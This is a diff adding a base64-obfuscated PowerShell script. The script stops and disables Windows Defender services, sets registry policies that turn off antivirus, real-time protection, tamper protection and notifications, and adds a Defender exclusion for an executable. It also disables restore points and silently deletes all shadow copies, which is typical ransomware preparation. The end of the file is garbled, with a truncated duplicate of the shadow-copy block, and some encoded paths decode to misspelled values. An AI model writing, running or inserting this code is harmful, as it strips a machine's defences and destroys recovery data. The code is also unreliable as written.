@@ -1,0 +1,153 @@
+try {
+   
+    $servicesB64 = @(
+        "V2luRGVmZW5k",           # WinDefend
+        "U2Vuc2U=",               # Sense
+        "V2ROaXNTdmc=",           # WdNisSvc
+        "TXNNcFN2Yw==",           # MsMpSvc
+        "U2VjdXJpdHlIZWFsdGhTZXJ2aWNl", # SecurityHealthService
+        "V2RCb290",               # WdBoot
+        "V2RGaWx0ZXI="            # WdFilter
+    )
+    
+    foreach ($b64 in $servicesB64) {
+        $name = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
+        $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
+        if ($svc -and $svc.Status -eq "Running") {
+            Stop-Service $name -Force -ErrorAction SilentlyContinue
+        }
+        Set-Service $name -StartupType Disabled -ErrorAction SilentlyContinue
+    }
+
+    
+    $regPathsB64 = @(
+        "S0xNTDpXOlNPRlRXQVJFXFJvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy",
+        "S0xNTDpXOlNPRlRXQVJFXFJvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9u",
+        "S0xNTDpXOlNPRlRXQVJFXFJvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFNweW5ldA==",
+        "S0xNTDpXOlNPRlRXQVJFXFJvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXE1wRW5naW5l",
+        "S0xNTDpXOlNPRlRXQVJFXFJvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEZlYXR1cmVz",
+        "S0xNTDpXOlNPRlRXQVJFXFJvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIFNlY3VyaXR5XEhlYWx0aA=="
+    )
+    
+    foreach ($regB64 in $regPathsB64) {
+        $path = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($regB64))
+        if (-not (Test-Path $path)) {
+            New-Item -Path $path -Force | Out-Null
+        }
+    }
+
+    
+    $settings = @{
+        "RGlzYWJsZUFudGlTcHlwYXJl" = 1;    # DisableAntiSpyware
+        "RGlzYWJsZUFudGlWaXJ1cw==" = 1;    # DisableAntiVirus
+        "RGlzYWJsZUFudGltYWx3YXJl" = 1;    # DisableAntimalware
+
+        "RGlzYWJsZVJlYWxUaW1lUHJvdGVjdGlvbg==" = 1;  # DisableRealtimeMonitoring
+        "RGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZw==" = 1;  # DisableBehaviorMonitoring
+        "RGlzYWJsZVNjYW5PblllYWx0aW1lRW5hYmxl" = 1;  # DisableScanOnRealtimeEnable
+        "RGlzYWJsZUxvY2FsQ2xlYW5FeGVjdXRpb24=" = 1;  # DisableLocalCleanExecution
+
+        "RGlzYWJsZUJsb2NrQXRGaXJzdFNlZW4=" = 1;      # DisableBlockAtFirstSeen
+        "U3B5bmV0UmVwb3J0aW5n" = 0;                   # SpynetReporting
+        "U3VibWl0U2FtcGxlc0NvbnNlbnQ=" = 2;           # SubmitSamplesConsent
+
+        "TXBFbmFibGVQdXMK" = 0;                        # MpEnablePus
+        "VGFtcGVyUHJvdGVjdGlvbg==" = 0;               # TamperProtection
+
+        "RGlzYWJsZVZvdGlmaWNhdGlvbnM=" = 1;           # DisableNotifications
+        "RGlzYWJsZVVT" = 1;                            # DisableUI
+    }
+
+    $basePath1 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    $basePath2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+    $basePath3 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
+    $basePath4 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine"
+    $basePath5 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Features"
+    $basePath6 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Security\Health"
+
+
+    foreach ($key in $settings.Keys) {
+        $decodedKey = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($key))
+        $val = $settings[$key]
+
+        switch ($decodedKey) {
+            "DisableAntiSpyware" {
+                Set-ItemProperty -Path $basePath1 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableAntiVirus" {
+                Set-ItemProperty -Path $basePath1 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableAntimalware" {
+                Set-ItemProperty -Path $basePath1 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableRealtimeMonitoring" {
+                Set-ItemProperty -Path $basePath2 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableBehaviorMonitoring" {
+                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableScanOnRealtimeEnable" {
+                Set-ItemProperty -Path $basePath2 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableLocalCleanExecution" {
+                Set-ItemProperty -Path $basePath2 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableBlockAtFirstSeen" {
+                Set-ItemProperty -Path $basePath3 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "SpynetReporting" {
+                Set-ItemProperty -Path $basePath3 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "SubmitSamplesConsent" {
+                Set-ItemProperty -Path $basePath3 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "MpEnablePus" {
+                Set-ItemProperty -Path $basePath4 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "TamperProtection" {
+                Set-ItemProperty -Path $basePath5 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableNotifications" {
+                Set-ItemProperty -Path $basePath6 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+            "DisableUI" {
+                Set-ItemProperty -Path $basePath6 -Name $decodedKey -Value $val -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+
+    
+    $taskPathB64 = "XE1pY3Jvc29mdFxXaW5kb3dzXFdpbmRvd3MgRGVmZW5kZXJc"
+    $taskPath = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($taskPathB64))
+    $tasks = Get-ScheduledTask -TaskPath $taskPath -ErrorAction SilentlyContinue
+    if ($tasks) {
+        Disable-ScheduledTask -TaskPath $taskPath -TaskName * -ErrorAction SilentlyContinue
+    }
+
+    
+    $exclusionB64 = "QzpcUHJvZ3JhbSBGaWxlcmluZ1xVeHlkdWx1bWFLbGFzb3J1XFByb2dyYW1pbkFkaS5leGU="
+    $exclusionPath = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($exclusionB64))
+    
+    Import-Module -Name Defender -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
+
+    
+    $restorePoints = Get-ComputerRestorePoint -ErrorAction SilentlyContinue
+    foreach ($rp in $restorePoints) {
+        (Get-WmiObject -Class SystemRestore -Namespace root\default).DisableSR($rp.SequenceNumber)
+    }
+
+    
+    vssadmin delete shadows /all /quiet
+
+}
+catch {}orePoints = Get-ComputerRestorePoint -ErrorAction SilentlyContinue
+    foreach ($rp in $restorePoints) {
+        (Get-WmiObject -Class SystemRestore -Namespace root\default).DisableSR($rp.SequenceNumber)
+    }
+
+    # Delete shadow copies silently
+    vssadmin delete shadows /all /quiet
+
+}
+catch {}
